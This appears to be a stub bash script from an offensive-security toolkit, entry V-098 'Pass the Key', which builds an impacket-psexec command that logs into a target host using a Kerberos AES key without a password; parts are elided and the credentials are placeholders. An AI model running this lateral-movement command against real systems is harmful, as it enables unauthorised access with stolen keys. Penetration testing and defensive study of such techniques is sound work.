#!/usr/bin/env bash
# V-098.sh — Pass the Key
# Category: Host, Software and internal architecture
# Tool: impacket-psexec
# Usage: bash V-098.sh <SESSION> <TARGET>
# Place at: ~/Desktop/trinetra/scripts/hexstrike/V-098.sh
set -euo pipefail

SESSION="${1:?ERROR: usage: bash V-098.sh <session> <target>}"
TARGET="${2:?ERROR: usage: bash V-098.sh <session> <target>}"
...
CMD="impacket-psexec domain/user@$TARGET -k -no-pass -aesKey KEY"

echo "[hex] V-098: Pass the Key → $TARGET"
...
python3 - \
    ...
    "V-098" "Pass the Key" "Host, Software and internal architecture" "impacket-psexec" \
